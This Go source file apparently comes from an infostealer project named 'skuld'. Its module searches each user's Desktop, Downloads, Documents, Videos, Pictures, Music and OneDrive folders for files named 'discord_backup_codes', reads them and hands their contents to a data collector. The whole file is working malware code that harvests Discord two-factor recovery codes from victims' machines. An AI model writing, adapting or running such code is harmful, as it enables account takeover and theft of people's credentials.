package discodes

import (
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
	"os"
	"path/filepath"
	"strings"
)

func Run(dataCollector *collector.DataCollector) {
	for _, user := range hardware.GetUsers() {
		for _, dir := range []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		} {
			if _, err := os.Stat(dir); err != nil {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if info.IsDir() {
					return nil
				}
				if info.Size() > 2*1024*1024 {
					return nil
				}
				if !strings.HasPrefix(info.Name(), "discord_backup_codes") {
					return nil
				}
				data, err := os.ReadFile(path)
				if err != nil {
					return nil
				}
				
				// Add backup codes to collector
				codesData := map[string]interface{}{
					"FilePath": path,
					"Codes":    string(data),
				}
				dataCollector.AddData("discord_backup_codes", codesData)
				return nil
			})
		}
	}
}
